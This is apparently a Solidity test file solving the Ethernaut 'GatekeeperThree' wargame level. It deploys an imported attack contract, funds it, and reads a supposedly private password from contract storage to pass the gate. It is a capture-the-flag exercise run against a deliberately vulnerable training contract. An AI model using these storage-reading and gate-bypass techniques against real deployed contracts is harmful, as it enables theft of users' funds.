pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../GatekeeperThree/GatekeeperThreeHack.sol";
import "../GatekeeperThree/GateKeeperThreeFactory.sol";
import "../Ethernaut.sol";
import "./utils/vm.sol";

contract GatekeeperThreeTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        // Setup instance of the Ethernaut contracts
        ethernaut = new Ethernaut();
        // Deal EOA address some ether
        vm.deal(eoaAddress, 5 ether);
    }

    function testGatekeeperThreeHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        GatekeeperThreeFactory gatekeeperThreeFactory = new GatekeeperThreeFactory();
        ethernaut.registerLevel(gatekeeperThreeFactory);
        vm.startPrank(tx.origin);
        address levelAddress = ethernaut.createLevelInstance(gatekeeperThreeFactory);
        GatekeeperThree ethernautGatekeeperThree = GatekeeperThree(payable(levelAddress));
        ethernautGatekeeperThree.createTrick();
        vm.warp(block.timestamp + 10);
        vm.stopPrank();
        vm.startPrank(eoaAddress);

        //////////////////
        // LEVEL ATTACK //
        //////////////////

    
        // Create attacking contract and send enough ETH to execute the attack
        GatekeeperThreeHack gatekeeperThreeHack = new GatekeeperThreeHack(levelAddress);
        payable(address(gatekeeperThreeHack)).send(0.0011 ether);
        // Read the password in the third storage slot
        gatekeeperThreeHack.enter(uint256(vm.load(address(ethernautGatekeeperThree.trick()), bytes32(uint256(2)))));
        
        
        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        vm.stopPrank();
        vm.startPrank(tx.origin);
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}